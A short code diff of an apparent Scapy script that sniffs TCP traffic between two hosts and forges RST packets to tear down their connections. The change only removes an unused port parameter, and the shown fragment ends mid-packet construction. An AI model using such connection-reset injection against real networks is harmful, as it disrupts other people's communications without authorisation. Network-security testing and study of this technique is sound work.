@@ -21,12 +21,12 @@ def track_and_reset(src_ip, dst_ip, dst_port):
 
         rev_key = (ip.dst, ip.src)
         if rev_key in flows:
-            inject_rst(flows, src_ip, dst_ip, dst_port)
+            inject_rst(flows, src_ip, dst_ip)
 
     sniff(filter=f"tcp and host {src_ip} and host {dst_ip} and port {dst_port}",
           prn=pkt_cb, store=False)
 
-def inject_rst(flows, src_ip, dst_ip, dst_port):    
+def inject_rst(flows, src_ip, dst_ip):    
     fwd_next_seq, fwd_tcp = flows[(src_ip, dst_ip)]
     fwd_rst = (IP(src=src_ip, dst=dst_ip) /
                TCP(sport=fwd_tcp.sport, dport=fwd_tcp.dport,
